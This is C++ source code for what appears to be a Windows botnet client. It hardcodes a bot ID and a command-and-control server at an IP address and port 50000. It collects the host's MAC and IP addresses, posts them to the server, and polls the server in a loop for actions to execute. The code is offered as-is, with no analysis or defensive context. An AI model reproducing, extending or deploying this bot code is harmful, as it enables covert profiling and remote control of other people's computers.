#include "lib\DataCollector.h"
#include "lib\UtilLib.h"
#define FREQUENCY
#include <Windows.h>
#include <iostream>
#include "lib\ActionController.h"
#include "lib\HttpLib.h"
#include "lib\ThreadController.h"
#include <vector>

char* GetIP();
void handleAction();


#if defined(THREADING)
ThreadController tc;
#endif
char *BOT_ID = "OCQwzxHSdFLk2LMP1N9ak0QhzHOnxAgx";
int COUNT = 3;
#ifdef ENCODE_HTTP
	bool encode = true;
#else
	bool encode = false;
#endif
#pragma comment(lib, "ws2_32.lib")
int WAIT = 1;
DataCollector dc;
const int ACTION_LIMIT = -1;
ActionController ac;
#define BOTLOOP
int port = 50000;
int ACTION_COUNT = 0;
#define REQ_COUNT
vector<vector<string>> requestQueue;
string url = "104.39.3.120";

using namespace std;

int main(){
#if defined(BOTLOOP) || defined(EXECUTE)
char* MAC_ADDR = getMAC();
dc.addDataPair("bot_id", BOT_ID);
dc.addDataPair("mac_address", MAC_ADDR);
#endif

#ifdef EXECUTE
sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData(), WAIT);
dc.dumpCollectedData();
#endif
#ifdef BOTLOOP
string response = "";
struct Action action;
ac.addAction(action);
int reqCounter = 0;
while(notDone(ACTION_COUNT, ACTION_LIMIT)){
	ACTION_COUNT++;
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	if (waitForTime(TIMEARRAY, sizeof(TIMEARRAY), COUNT)){
#endif
		response = sendG_Request(url, port, "/database/api/connect_in/", requestQueue, dc.getGetData(), WAIT);
		action = ac.parseAction(response);
		ac.addAction(action);
		handleAction();
		reqCounter++;
		Sleep(3000);
		if(reqCounter % 1 == 0){
			sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData(), WAIT);
			dc.dumpCollectedData();
		}
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	}
#endif
}
#endif
#if defined THREADING
tc.closeAllThreads();
#endif
}

char* GetIP()
{
WSAData wsaData;
WSAStartup(MAKEWORD(2, 2), &wsaData);
HOSTENT* Host;
char hostname[128] = { 0 };
char* IPv4 = new char[128];
gethostname(hostname, 128);
Host = gethostbyname(hostname);
IPv4 = inet_ntoa(*(in_addr*)Host->h_addr_list[0]);
WSACleanup();
return IPv4;
}
void handleAction(){
struct Action action;
while(ac.hasAction()){
action = ac.getNextAction();
printf("action %s\n", action.action.c_str());
if(action.action == "Send IP Address"){
printf("doing action %s\n", action.action.c_str());
char *ip = GetIP();
dc.addDataPair("ip_address", ip);
}
action = ac.getNextAction();
}
}
